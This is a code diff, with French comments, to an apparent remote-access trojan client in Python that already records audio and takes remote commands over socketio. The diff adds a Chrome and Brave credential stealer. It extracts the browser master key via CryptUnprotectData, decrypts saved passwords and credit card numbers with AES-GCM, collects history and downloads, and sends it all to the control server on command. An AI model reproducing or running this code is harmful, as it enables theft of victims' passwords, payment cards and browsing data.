@@ -1,13 +1,52 @@
 import base64
 import io
+import json
+import os
 import platform
+import shutil
+import sqlite3
 import time
 import wave
 
 import pyaudio
 import pyautogui
 import socketio
+from Crypto.Cipher import AES
 from PIL import Image
+from win32crypt import CryptUnprotectData
+
+# Configuration des chemins et des requêtes pour les navigateurs
+appdata = os.getenv('LOCALAPPDATA')
+browsers = {
+    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
+    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
+}
+data_queries = {
+    'login_data': {
+        'query': 'SELECT action_url, username_value, password_value FROM logins',
+        'file': '\\Login Data',
+        'columns': ['URL', 'Email', 'Password'],
+        'decrypt': True
+    },
+    'credit_cards': {
+        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
+        'file': '\\Web Data',
+        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
+        'decrypt': True
+    },
+    'history': {
+        'query': 'SELECT url, title, last_visit_time FROM urls',
+        'file': '\\History',
+        'columns': ['URL', 'Title', 'Visited Time'],
+        'decrypt': False
+    },
+    'downloads': {
+        'query': 'SELECT tab_url, target_path FROM downloads',
+        'file': '\\History',
+        'columns': ['Download URL', 'Local Path'],
+        'decrypt': False
+    }
+}
 
 sio = socketio.Client(reconnection=True, reconnection_attempts=5, reconnection_delay=2, ssl_verify=False)
 
@@ -16,6 +55,59 @@ system_info = {
     'os_version': platform.version(),
     'hostname': platform.node()
 }
+
+
+# Fonctions pour la gestion des données des navigateurs
+def get_master_key(path: str):
+    if not os.path.exists(path):
+        return None
+    with open(path + "\\Local State", "r", encoding="utf-8") as f:
+        local_state = json.loads(f.read())
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    key = key[5:]
+    return CryptUnprotectData(key, None, None, None, 0)[1]
+
+
+def decrypt_password(buff: bytes, key: bytes) -> str:
+    iv = buff[3:15]
+    payload = buff[15:]
+    cipher = AES.new(key, AES.MODE_GCM, iv)
+    decrypted_pass = cipher.decrypt(payload)
+    decrypted_pass = decrypted_pass[:-16].decode()
+    return decrypted_pass
+
+
+def get_data(path: str, profile: str, key, type_of_data):
+    db_file = f'{path}\\{profile}{type_of_data["file"]}'
+    if not os.path.exists(db_file):
+        return None
+    shutil.copy(db_file, 'temp_db')
+    conn = sqlite3.connect('temp_db')
+    cursor = conn.cursor()
+    cursor.execute(type_of_data['query'])
+    result = ""
+    for row in cursor.fetchall():
+        if type_of_data['decrypt']:
+            row = [decrypt_password(x, key) if isinstance(x, bytes) else x for x in row]
+        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
+    conn.close()
+    os.remove('temp_db')
+    return result
+
+
+def installed_browsers():
+    return [x for x in browsers if os.path.exists(browsers[x])]
+
+
+def send_browser_data():
+    available_browsers = installed_browsers()
+    for browser in available_browsers:
+        browser_path = browsers[browser]
+        master_key = get_master_key(browser_path)
+        for data_type_name, data_type in data_queries.items():
+            data = get_data(browser_path, "Default", master_key, data_type)
+            if data:
+                sio.emit('browser_data_response', {'browser': browser, 'type': data_type_name, 'data': data})
 
 
 def log_event(message):
@@ -49,6 +141,9 @@ def command(data):
         params = data.get('params', {})
         duration = int(params.get('duration', 10))
         record_and_send_audio(duration)
+    elif command == 'browser_data':
+        log_event("Commande de données de navigateur reçue")
+        send_browser_data()
     else:
         log_event(f"Commande non reconnue: {command}")
 
